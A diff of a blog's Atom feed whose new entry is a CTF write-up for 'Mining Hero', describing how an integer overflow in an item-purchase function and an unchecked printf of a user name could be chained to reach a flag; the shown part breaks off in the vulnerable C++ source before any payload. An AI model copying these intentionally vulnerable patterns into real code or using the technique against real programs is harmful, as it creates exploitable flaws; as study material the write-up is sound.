@@ -1,4 +1,432 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-10-21T22:29:36-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Simple Heap Buffer Overflow</title><link href="http://localhost:4000/2020/10/21/simple-heap-buffer-overflow.html" rel="alternate" type="text/html" title="Simple Heap Buffer Overflow" /><published>2020-10-21T00:00:00-04:00</published><updated>2020-10-21T00:00:00-04:00</updated><id>http://localhost:4000/2020/10/21/simple-heap-buffer-overflow</id><content type="html" xml:base="http://localhost:4000/2020/10/21/simple-heap-buffer-overflow.html">&lt;p&gt;Earlier today, I was messing around with some code, and I came up with &lt;a href=&quot;../../../assets/other/2020-10-21-heap-buffer-overflow/people.c&quot;&gt;this vulnerable program&lt;/a&gt;. This program was written using bad programming habits on purpose, and I am going to show you how it is vulnerable to a buffer overflow. This isn’t a complicated vulnerability, and while it does involve corrupting memory on the heap, it does not require you to have in-depth knowledge about how the heap works (unlike many other heap exploits).&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-10-25T11:34:35-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Mining Hero Vulnerabilities</title><link href="http://localhost:4000/2020/10/25/mining-hero-vulnerabilities.html" rel="alternate" type="text/html" title="Mining Hero Vulnerabilities" /><published>2020-10-25T00:00:00-04:00</published><updated>2020-10-25T00:00:00-04:00</updated><id>http://localhost:4000/2020/10/25/mining-hero-vulnerabilities</id><content type="html" xml:base="http://localhost:4000/2020/10/25/mining-hero-vulnerabilities.html">&lt;p&gt;&lt;a href=&quot;../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game.cpp&quot;&gt;Mining Hero&lt;/a&gt; (click &lt;a href=&quot;../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game&quot;&gt;here&lt;/a&gt; for the binary) is a CTF problem I solved when I played in MetaCTF over this weekend. It involves chaining an integer overflow vulnerability with a format string vulnerability in order to obtain the flag. This is my writeup for how I exploited the binary.&lt;/p&gt;
+
+&lt;p&gt;When I compiled the binary, &lt;code class=&quot;highlighter-rouge&quot;&gt;g++&lt;/code&gt; immediately told me that there was a format string vulnerability in the code. This information will become useful later.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ &lt;span class=&quot;nt&quot;&gt;-fno-stack-protector&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Wall&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; text-game text-game.cpp
+text-game.cpp: In &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘void purchase&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;’:
+text-game.cpp:150:34: warning: operation on ‘tools_left’ may be undefined &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wsequence-point&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+  150 |    &amp;lt;&amp;lt; &lt;span class=&quot;s2&quot;&gt;&quot;now have &quot;&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tools_left +&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; count - 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&quot;s2&quot;&gt;&quot; spare tool&quot;&lt;/span&gt;
+      |                      ~~~~~~~~~~~~^~~~~~~~~~~~~
+text-game.cpp:161:41: warning: suggest parentheses around comparison &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;operand of ‘&amp;amp;’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wparentheses&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+  161 |   bool god_is_happy &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; rand&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &amp;amp; 0xFFFFFF &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      |                                ~~~~~~~~~^~~~
+text-game.cpp:164:22: warning: format not a string literal and no format arguments &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wformat-security&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+  164 |   &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name.c_str&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When I first played the game, I was given four different options.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./text-game 
+Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
+Before we continue, what is your name?
+Nihaal
+Current funds: $150
+Your options are: 
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Selecting option two is the only reliable way to make more money. The downside to using this option is that it pauses the program for a moment (by calling the &lt;code class=&quot;highlighter-rouge&quot;&gt;usleep()&lt;/code&gt; function), making it difficult to brute-force the program using only this option.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2
+You go to work in the mines
+[..........]
+[=.........]
+[==........]
+[===.......]
+[====......]
+[=====.....]
+[======....]
+[=======...]
+[========..]
+[=========.]
+[==========]
+It was a normal days work. You earned $7. Your balance is now $157.
+Current funds: $157
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Option one gives you a chance to double your money.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1
+A coin will be flipped. Before the coin is flipped, you may pick heads or tails. If you guess correctly, any money you bet will be doubled. Otherwise, the money will be forfeit. Enter heads, tails, or cancel
+heads
+How much would you like to bet that the coin will come up heads? Enter a number between 1 and 157.
+157
+... and the coin came up heads!! You just got $157! Congratulations! Your balance is $314
+Current funds: $314
+Your options are: 
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Option three is interesting. It allows us to buy various things that could either allow us to mine things faster (encouragement) or get more money while mining (tools). It also includes a &lt;code class=&quot;highlighter-rouge&quot;&gt;shout-out-from-literally-god&lt;/code&gt; option, which costs a huge sum of money.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+encouragement
+How many would you like to buy? Must be greater than 0
+1
+You can do it! Go you!
+You are now very encouraged! Your mining speed has increased.
+Current funds: $294
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;purchase()&lt;/code&gt; function in the code, it appears that our goal is to somehow buy the &lt;code class=&quot;highlighter-rouge&quot;&gt;shout-out-from-literally-god&lt;/code&gt; option. However, even if we buy this option, there is still no guarantee that we will get the flag. The function only prints out the flag if &lt;code class=&quot;highlighter-rouge&quot;&gt;rand() &amp;amp; 0xFFFFFF&lt;/code&gt; equals zero, and since there is no way for us to actually control the output of &lt;code class=&quot;highlighter-rouge&quot;&gt;rand()&lt;/code&gt;, there is no way for us to guarantee that we get the flag even after getting a shout out from god.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;purchase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+
+    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;shout-out-from-literally-god&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;god_is_happy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFFFFF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;god_is_really_happy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;god_is_happy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hmmmm&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;You have done well!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Good job!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;god_is_really_happy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I'm feeling generous right now!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Have a flag!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifstream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;istreambuf_iterator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
+				                 &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;istreambuf_iterator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sincerely,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;~God&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When looking at this block of code, one thing that I thought was strange was that the programmer made a function pointer called &lt;code class=&quot;highlighter-rouge&quot;&gt;bool* god_is_really_happy&lt;/code&gt;. The first question that popped into my mind was, “What was the point of making this pointer?” It seems pretty much useless since the programmer could have just used &lt;code class=&quot;highlighter-rouge&quot;&gt;god_is_happy&lt;/code&gt; in place of &lt;code class=&quot;highlighter-rouge&quot;&gt;*god_is_really_happy&lt;/code&gt; in the if statement.&lt;/p&gt;
+
+&lt;p&gt;My question was answered when I looked a little bit further down and remembered the format string vulnerability. The line that says &lt;code class=&quot;highlighter-rouge&quot;&gt;printf(name.c_str())&lt;/code&gt; prints out our name directly using &lt;code class=&quot;highlighter-rouge&quot;&gt;printf()&lt;/code&gt; instead of using a format string (The secure way of doing this would be to use &lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;%s&quot;, name.c_str())&lt;/code&gt;). We could exploit the format string vulnerability by putting string formatters in &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;At this point in time, we have two goals:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Find a vulnerability that allows us to buy the &lt;code class=&quot;highlighter-rouge&quot;&gt;shout-out-from-literally-god&lt;/code&gt; option.&lt;/li&gt;
+  &lt;li&gt;Exploit the format string vulnerability to write anything (other than zero) to the address &lt;code class=&quot;highlighter-rouge&quot;&gt;god_is_really_happy&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Instead of doing step one, you could also try to brute-force the program until you got enough money, but I didn’t go with that solution.&lt;/p&gt;
+
+&lt;p&gt;The first vulnerability took me a long time to see. I manually inputted various characters when the program asked for a specific type of input, and I was specifically looking for integer overflow vulnerabilities that increased my money (though, I would later find out that increasing my money was not necessary). Typing -1 when betting did not work.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Current funds: $150
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+1
+A coin will be flipped. Before the coin is flipped, you may pick heads or tails. If you guess correctly, any money you bet will be doubled. Otherwise, the money will be forfeit. Enter heads, tails, or cancel
+heads
+How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
+-1
+How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
+-1
+How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, when I did the same thing while buying something, the program said that I didn’t have enough money to buy encouragement, even though I did. The only reasonable explanation for this behavior would be that it interprets the quantity as an unsigned integer, even though I am typing it as a signed integer.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+encouragement
+How many would you like to buy? Must be greater than 0
+-1
+You don't have the money for that!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I spent a few minutes trying out a bunch of different negative numbers to see if any of them would allow me to actually buy &lt;code class=&quot;highlighter-rouge&quot;&gt;encouragement&lt;/code&gt;. Although I was unsuccessful by simply using trial-and-error, this was enough to pique my interest, so I decided to take another look at the code for purchasing items. In the top half of the &lt;code class=&quot;highlighter-rouge&quot;&gt;purchase()&lt;/code&gt;, we can see exactly how the quantity is interpreted.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;purchase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prices&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;tool&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;encouragement&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;shout-out-from-literally-god&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000000000000ULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;What would you like to buy? Options are &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prices&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; (cost: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;), &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;or cancel&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cancel&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prices&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prices&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+
